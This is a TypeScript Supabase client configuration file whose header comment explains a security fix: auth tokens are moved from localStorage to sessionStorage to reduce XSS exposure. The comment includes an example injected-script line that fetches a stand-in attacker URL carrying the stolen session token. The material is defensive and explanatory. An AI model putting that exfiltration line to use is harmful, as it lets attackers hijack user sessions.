/**
 * client.ts — Supabase client
 *
 * SECURITY FIX #5 — localStorage → sessionStorage for auth tokens.
 *
 * VULNERABILITY (before fix):
 *   Using localStorage means the JWT session token persists indefinitely
 *   across browser restarts, AND is accessible to ANY JavaScript running
 *   on the page (including injected third-party scripts).
 *
 *   Attack chain:
 *     1. Attacker finds an XSS vector (e.g. a review with a crafted payload
 *        rendered via react-markdown without sanitisation, or a third-party
 *        script that's compromised).
 *     2. Injected script runs: fetch('https://attacker.com/?t=' + localStorage.getItem('sb-...'))
 *     3. Attacker gets a valid session token and can act as the victim.
 *
 * FIX APPLIED:
 *   - Switch to sessionStorage (cleared on tab/window close, harder to exfiltrate
 *     from a different tab, still in-memory JS land but much reduced exposure).
 *   - Set a short autoRefreshToken window.
 *   - NOTE: If you want maximum security, replace with a httpOnly cookie-based
 *     session via a BFF (Backend-For-Frontend). Supabase Auth SSR helpers support
 *     this pattern: https://supabase.com/docs/guides/auth/server-side/overview
 *
 * ALSO ADDED:
 *   - Guard against missing env vars at module load time (fail loudly, not silently).
 */
import { createClient } from '@supabase/supabase-js';
import type { Database } from './types';

const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL as string;
const SUPABASE_PUBLISHABLE_KEY =
  (import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY ||
    import.meta.env.VITE_SUPABASE_ANON_KEY) as string;

if (!SUPABASE_URL || !SUPABASE_PUBLISHABLE_KEY) {
  throw new Error(
    "[Security] VITE_SUPABASE_URL or VITE_SUPABASE_PUBLISHABLE_KEY is missing. " +
    "Check your .env.local file."
  );
}

// Import the supabase client like this:
// import { supabase } from "@/integrations/supabase/client";
export const supabase = createClient<Database>(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY, {
  auth: {
    // FIX: sessionStorage instead of localStorage.
    // Tokens are cleared when the browser tab is closed, reducing
    // the XSS exfiltration window compared to localStorage.
    storage: sessionStorage,
    persistSession: true,
    autoRefreshToken: true,
    // Detect session in URL hash (for OAuth callbacks) and clean up immediately.
    detectSessionInUrl: true,
    flowType: "pkce",
  },
});
